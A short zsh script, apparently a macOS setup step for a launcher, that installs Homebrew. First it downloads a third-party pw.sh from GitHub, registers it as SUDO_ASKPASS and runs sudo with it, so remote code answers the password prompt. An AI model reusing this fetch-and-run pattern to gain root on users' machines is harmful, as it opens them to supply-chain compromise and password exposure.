#!/bin/zsh
mkdir ~/bin
touch ~/bin/pw.sh
curl https://raw.githubusercontent.com/4193883-eng/skyveLauncher/main/pw.sh > ~/bin/pw.sh
chmod +x ~/bin/pw.sh
export SUDO_ASKPASS="${HOME}/bin/pw.sh"
sudo -A ls
NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Add Homebrew to PATH
echo 'export PATH="/usr/local/bin:/opt/homebrew/bin:$PATH"' >> ~/.zshrc
source ~/.zshrc
